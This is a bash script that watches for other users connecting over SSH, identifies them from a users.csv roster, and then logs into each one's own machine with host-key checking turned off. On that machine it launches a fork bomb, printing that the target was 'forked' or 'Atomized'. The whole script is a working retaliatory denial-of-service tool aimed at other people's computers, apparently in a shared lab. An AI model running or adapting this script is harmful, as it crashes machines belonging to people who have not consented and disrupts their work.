#!/bin/bash

declare -a USERS_LIST=()
declare -a USERS_PID_KILLED=()

main () {
	clear
	
	eval `ssh-agent -s` > /dev/null
	eval `ssh-add ~/.ssh/id_rsa`
	
	echo 'Loading database...'
	load_users
	
	echo
	echo 'Connected users scan...'
	
	while [ true ]; do
		echo -n '... '
		
		connected_users=$(ps aux | grep ' sshd' | tr -s ' ' | sed "/^[$USER,root,sshd]/d" | cut -d' ' -f1 | tr ' ' '\n')
		
		for user in $connected_users; do
			user_ip=$(who | tr -d '()' | tr -s ' ' | grep "$user" | cut -d' ' -f5 | cut -d'.' -f1)
			
			if [[ ${#USERS_PID_KILLED[@]} == 0 ]]; then
				user_pids=$(ps aux | grep ' sshd' | tr -s ' ' | grep "$user" | cut -d' ' -f5 | tr ' ' '\n')
				user_pid_found=false
				user_pids_selected=($user_pids)
				
			else
				users_pid_regex=''
				for user_pid in "${USERS_PID_KILLED[@]}"; do
					users_pid_regex+="$user_pid,"
				done
				users_pid_regex=${users_pid_regex%?}
				
				user_pids_selected=$(ps aux | grep ' sshd' | tr -s ' ' | grep "$user" | cut -d' ' -f5 | sed "/^[$users_pid_regex]/d" | tr ' ' '\n')
			fi
			
			if [ ! -z "$user_pids_selected" ]; then
				user_id="_unknown_"
				
				for dbUser in "${USERS_LIST[@]}"; do
					if [[ "${dbUser}" =~ "${user}" ]]; then
						user_id=$dbUser
						break
					fi
				done
				
				echo
							
				notify-send -t 7500 -u critical "User connected \"$user_id($user_pids_selected)\" at \"$user_ip\" !"
				echo "User connected \"$user_id($user_pids_selected)\" at \"$user_ip\" !"
			
				if [[ "$user_ip" =~ "corton" ]]; then
					notify-send -t 4500 -u critical "User \"$user_id\" is connected to corton '--"
					echo "User \"$user_id\" is connected to corton '--"
					
				else
					do_bomb $user_ip
					USERS_PID_KILLED+=($user_pids_selected)
		
					notify-send -t 4500 -u critical "User \"$user_id\" forked."
					echo "User \"$user_id\" forked :')"
				fi
				
				echo
			fi
		done
		
		sleep 1
	done
}

load_users () {
	while IFS=';' read lastname firstname group id photo; do
		USERS_LIST+=("${id}_${lastname}_${firstname}_${group}")
	done < 'users.csv'
}

do_bomb () {
	current_target=$1
	final_command=':(){ :|: & };:'

	ssh-keygen -R $current_target > /dev/null 2> /dev/null
	ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $current_target "$final_command;exit" &
	echo "   > Atomized $current_target."
}

main
